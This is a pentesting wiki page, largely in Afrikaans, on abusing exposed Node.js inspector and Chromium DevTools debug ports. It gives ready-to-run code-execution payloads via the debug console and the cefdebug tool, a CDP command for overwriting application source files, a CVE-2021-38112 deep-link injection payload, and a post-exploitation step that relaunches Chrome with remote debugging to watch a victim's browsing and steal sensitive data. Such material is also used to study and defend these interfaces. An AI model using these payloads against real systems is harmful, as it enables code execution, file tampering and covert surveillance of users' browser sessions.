# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Historiese praktiese voorbeelde sluit die Multimaster walkthrough en die CVE-2019-1414 Visual Studio Code debugger attack in; gebruik hulle as weergawe-spesifieke konteks eerder as om aan te neem dat elke huidige Electron- of Chromium-teiken dieselfde primitives blootstel.<sup>[[1]](#references)[[3]](#references)</sup>

## Basiese inligting

[From the docs](https://nodejs.org/learn/getting-started/debugging): Wanneer dit met die `--inspect` switch gestart word, luister ’n Node.js-process vir ’n debugging client. By **default** sal dit op host en port **`127.0.0.1:9229`** luister. Elke process kry ook ’n **unieke** **UUID** toegeken.<sup>[[4]](#references)</sup>

Inspector clients moet die host address, port en UUID ken en spesifiseer om te connect. ’n Volledige URL sal ongeveer soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` lyk.<sup>[[4]](#references)</sup>

> [!WARNING]
> Aangesien die **debugger volle toegang tot die Node.js execution environment het**, kan ’n malicious actor wat aan hierdie port kan connect moontlik arbitrary code namens die Node.js-process execute (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Daar is verskeie maniere om ’n inspector te start:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wanneer jy 'n geïnspekteerde proses begin, sal iets soos die volgende verskyn:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prosesse gebaseer op **CEF** (**Chromium Embedded Framework**) kan ’n debugger blootstel met `--remote-debugging-port=9222`. Dit stel die browser bloot deur die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) eerder as ’n Node.js inspector, dus is Node.js `process`-gebaseerde payloads nie by verstek direk toepaslik nie.<sup>[[2]](#references)[[5]](#references)</sup>

Wanneer jy ’n browser met debugging begin, sal iets soos die volgende verskyn:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets en same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in ’n webblaaier oopgemaak word, kan WebSocket- en HTTP-versoeke binne die blaaier-sekuriteitsmodel maak. ’n **Aanvanklike HTTP-verbinding** is nodig om ’n **unieke debugger-sessie-ID** te **verkry**. Die **same-origin-policy** **verhoed** dat webwerwe **hierdie HTTP-verbinding** kan maak. Vir bykomende sekuriteit teen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** verifieer Node.js dat die **'Host'-headers** vir die verbinding óf ’n **IP-adres** óf presies **`localhost`** spesifiseer.<sup>[[4]](#references)</sup>

> [!TIP]
> Hierdie **sekuriteitsmaatreëls voorkom dat die inspector uitgebuit word** om kode uit te voer deur **net ’n HTTP-versoek te stuur** (wat gedoen kan word deur ’n SSRF-vuln uit te buit).<sup>[[4]](#references)</sup>

### Inspector in lopende prosesse begin

Jy kan die **sein SIGUSR1** na ’n lopende nodejs-proses stuur om dit die **inspector** op die verstekpoort te laat begin. Let egter daarop dat jy voldoende voorregte moet hê; dit kan jou dus **bevoorregte toegang tot inligting binne die proses** gee, maar nie ’n direkte privilege escalation nie.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Dit is nuttig in containers omdat **die proses afskakel en ’n nuwe een** met `--inspect` **begin** **nie ’n opsie** is nie, omdat die **container** saam met die proses **beëindig** sal word.<sup>[[6]](#references)</sup>

### Koppel aan inspector/debugger

Om aan ’n **Chromium-based browser** te koppel, kan die `chrome://inspect`- of `edge://inspect`-URL's onderskeidelik vir Chrome of Edge verkry word. Deur op die Configure-knoppie te klik, moet daar verseker word dat die **teikenhost en -poort** korrek gelys is. Die beeld wys ’n Remote Code Execution (RCE)-voorbeeld:<sup>[[2]](#references)[[4]](#references)</sup>

![Nadat ’n URL om toegang tot die debugger te verkry verskyn het. bv. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Koppel aan inspector/debugger: Om aan ’n Chromium-based browser te koppel,...](<../../images/image (674).png>)

Met die **command line** kan jy aan ’n debugger/inspector koppel met:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Die tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), laat jou toe om **inspectors** wat plaaslik loop te vind en **code** daarin te **inject**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Let daarop dat **NodeJS RCE exploits nie sal werk nie** as dit via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aan ’n browser gekoppel is (jy moet die API nagaan om interessante dinge te vind om daarmee te doen).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> As jy hier beland het op soek na hoe om [**RCE van ’n XSS in Electron te verkry, kyk asseblief na hierdie bladsy.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Sommige algemene maniere om **RCE** te verkry wanneer jy aan ’n Node **inspector** kan **connect**, is om iets soos die volgende te gebruik (dit lyk asof dit **nie sal werk met ’n verbinding aan die Chrome DevTools protocol nie**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In hierdie afdeling sal ek bloot interessante dinge lys wat ek gevind het wat mense gebruik het om hierdie protokol te eksploiteer.

### Parameter Injection via Deep Links

In die [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino security ontdek dat 'n toepassing gebaseer op CEF 'n **custom UR**I in die stelsel geregistreer het (workspaces://index.html) wat die volledige URI ontvang het en daarna die **CEF gebaseerde applicatio**n geloods het met 'n konfigurasie wat gedeeltelik uit daardie URI saamgestel is.<sup>[[8]](#references)</sup>

Daar is ontdek dat die URI-parameters URL decoded is en gebruik is om die CEF basiese toepassing te loods, wat 'n gebruiker toegelaat het om die vlag **`--gpu-launcher`** in die **command line** te **inject** en arbitrêre dinge uit te voer.<sup>[[8]](#references)</sup>

Dus, 'n payload soos:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Sal 'n calc.exe uitvoer.<sup>[[8]](#references)</sup>

### Lêers oorskryf

Verander die vouer waar **afgelaaide lêers gestoor gaan word** en laai 'n lêer af om die gereeld gebruikte **bronkode** van die toepassing met jou **kwaadwillige kode** te **oorskryf**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE en exfiltration

STAR Labs het gewys dat blootgestelde WebDriver/CDP-dienste arbitrêre lêerlees en RCE kan moontlik maak; DNS rebinding kan die exploit-ketting in sommige konfigurasies voltooi.<sup>[[9]](#references)</sup>

Vir bykomende historiese browser-automation- en Chromium-sekuriteitsgevalle, sien die Counter WebDriver-skryfstuk en Project Zero-kwessies 773, 1742 en 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

In ’n werklike omgewing en **nadat ’n gebruiker se rekenaar gekompromitteer is** wat ’n Chrome/Chromium-gebaseerde browser gebruik, kan jy ’n Chrome-proses begin met **debugging geaktiveer en die debugging-poort geforward** sodat jy toegang daartoe kan verkry. Op hierdie manier sal jy **alles wat die slagoffer met Chrome doen, kan inspekteer en sensitiewe inligting kan steel**.<sup>[[7]](#references)</sup>

Die stealth-manier is om **elke Chrome-proses te terminate** en dan iets soos die volgende aan te roep:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger-inspeksie- en exploitation-tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Aan die gang](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Misbruik Chrome se debugging-funksie om blaaisessies op afstand waar te neem en te beheer](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
